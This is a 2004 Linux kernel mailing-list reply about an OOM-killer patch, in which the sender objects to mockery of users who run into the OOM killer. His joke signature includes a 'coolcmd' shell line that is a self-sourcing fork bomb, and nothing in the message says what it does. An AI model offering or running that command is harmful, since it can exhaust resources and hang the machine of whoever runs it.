Return-Path: <linux-kernel-owner+willy=40w.ods.org-S266748AbUI0MCO@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S266748AbUI0MCO (ORCPT <rfc822;willy@w.ods.org>);
	Mon, 27 Sep 2004 08:02:14 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S266758AbUI0MCO
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Mon, 27 Sep 2004 08:02:14 -0400
Received: from reptilian.maxnet.nu ([212.209.142.131]:21521 "EHLO
	reptilian.maxnet.nu") by vger.kernel.org with ESMTP id S266748AbUI0MCL
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Mon, 27 Sep 2004 08:02:11 -0400
From: Thomas Habets <thomas@habets.pp.se>
To: jonathan@jonmasters.org
Subject: Re: [PATCH] oom_pardon, aka don't kill my xlock
Date: Mon, 27 Sep 2004 14:00:56 +0200
User-Agent: KMail/1.7
Cc: linux-kernel@vger.kernel.org
MIME-Version: 1.0
Message-Id: <200409271401.03817.thomas@habets.pp.se>
Content-Type: multipart/signed;
  boundary="nextPart1339238.Labktj9Zql";
  protocol="application/pgp-signature";
  micalg=pgp-sha1
Content-Transfer-Encoding: 7bit
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

--nextPart1339238.Labktj9Zql
Content-Type: text/plain;
  charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline

> What we need is a mechanism to have a giant brainstraw emerge from the
> front casing of the machine and suck the brains out of the guy running
> a server with overcommit issues.

So the way to deal with OOM-killer issues is to laugh at people who encount=
er=20
it? How very openbsd of you.

And I don't run X or xlock on any of my servers. IOW: this was not a server.

=2D--------
typedef struct me_s {
  char name[]      =3D { "Thomas Habets" };
  char email[]     =3D { "thomas@habets.pp.se" };
  char kernel[]    =3D { "Linux" };
  char *pgpKey[]   =3D { "http://www.habets.pp.se/pubkey.txt" };
  char pgp[] =3D { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
  char coolcmd[]   =3D { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;

--nextPart1339238.Labktj9Zql
Content-Type: application/pgp-signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (GNU/Linux)

iD8DBQBBWAD/KGrpCq1I6FQRAkalAJwJq14N9AiBK35YIhqTF7XyaKgjzgCg2mV9
3ZmaPHwM+lw+OdJyV4V81XY=
=GK1B
-----END PGP SIGNATURE-----

--nextPart1339238.Labktj9Zql--
